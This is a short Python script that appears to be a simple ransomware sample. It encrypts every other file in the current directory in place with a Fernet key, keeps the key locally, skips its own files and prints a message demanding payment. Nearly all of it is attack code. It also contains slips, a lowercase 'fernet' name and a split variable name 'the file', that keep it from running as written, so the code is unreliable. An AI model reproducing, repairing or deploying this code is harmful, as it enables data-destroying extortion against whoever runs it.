import os
from cryptography.fernet import Fernet

#List for stolen files
files = []

#adds to list
for file in os.listdir():
    #Prevents virus from being added to list
    if file == "virus.py" or file == "viruskey.key" or file == "decrpyt.py":
        continue
    
    #Prevents test directory from being added to list
    if os.path.isfile(file):
        files.append(file)

#generates key
key = fernet.generate_key()

#saves key
with open("viruskey.key", "wb") as viruskey:
    viruskey.write(key)

#encrypts files
for file in files:
    with open(file, "rb") as thefile:
        contents = the file.read()
    contents_encrypt = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        the file.write(contents_encrypt)

#Display message       
print("Your files have been encrypted :). If you will like access to it, you" +
      "will need to pay...")


